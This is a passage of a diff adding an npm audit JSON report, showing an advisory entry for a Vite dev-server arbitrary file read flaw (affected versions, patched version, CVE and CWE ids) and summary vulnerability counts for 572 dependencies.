src=\"https://github.com/user-attachments/assets/6a230d2e-197a-4c9c-b373-d0129756d5d7\" />",
+      "reported_by": null,
+      "title": "Vite Vulnerable to Arbitrary File Read via Vite Dev Server WebSocket",
+      "metadata": null,
+      "cves": ["CVE-2026-39363"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.1",
+      "github_advisory_id": "GHSA-p9ff-h696-f583",
+      "recommendation": "Upgrade to version 7.3.2 or later",
+      "patched_versions": ">=7.3.2",
+      "updated": "2026-04-07T22:16:11.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-200", "CWE-306"],
+      "url": "https://github.com/advisories/GHSA-p9ff-h696-f583"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 5,
+      "high": 4,
+      "critical": 0
+    },
+    "dependencies": 572,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 572
+  }
+}
